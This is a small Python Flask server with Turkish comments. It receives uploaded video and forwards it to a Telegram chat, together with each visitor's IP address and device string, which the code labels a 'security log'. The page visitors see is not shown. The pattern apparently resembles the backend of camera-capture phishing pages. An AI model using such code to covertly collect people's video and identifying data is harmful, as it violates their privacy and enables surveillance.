import os
import telebot
from flask import Flask, render_template, request

app = Flask(__name__)
TOKEN = os.environ.get("TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/medya-gonder', methods=['POST'])
def medya_gonder():
    # 1. IP ve Cihaz Bilgilerini Al (DDoS / Güvenlik Logu İçin)
    ip_adresi = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_adresi:
        ip_adresi = ip_adresi.split(',')[0] # Gerçek IP'yi ayıkla
    cihaz = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
    
    log_mesaj = f"🛡️ GÜVENLİK LOGU 🛡️\n\n🌐 IP Adresi: {ip_adresi}\n📱 Cihaz: {cihaz}\n Durum: Kullanıcı video kaydı gönderdi."
    
    try:
        bot.send_message(CHAT_ID, log_mesaj)
    except Exception as e:
        print("Log hatası:", e)

    # 2. Videoyu Al ve Telegram'a Gönder
    if 'video' in request.files:
        video_dosyasi = request.files['video']
        try:
            bot.send_video(CHAT_ID, video_dosyasi, caption="🎥 Yeni video kaydı başarıyla alındı!")
            return "OK", 200
        except Exception as e:
            print("Video gönderme hatası:", e)
            return "HATA", 500
            
    return "Video bulunamadı", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
